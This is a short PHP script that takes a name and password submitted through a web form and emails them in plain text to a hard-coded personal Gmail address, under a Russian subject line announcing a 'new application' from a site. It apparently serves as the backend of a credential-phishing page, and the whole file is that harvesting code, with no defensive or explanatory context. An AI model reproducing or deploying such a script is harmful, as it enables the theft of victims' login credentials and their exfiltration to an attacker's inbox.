<?php

$recepient = "koryun.vardanyan.2002@gmail.com";
$sitename = "koryun.vardanyan2018@mail.ru";


$text = trim($_POST["text"]);
$name = trim($_POST["name"]);
$password = trim($_POST["password"]);

$message = " name: $name \password: $password";

$pagetitle = "Новая заявка с сайта \"$sitename\"";
mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");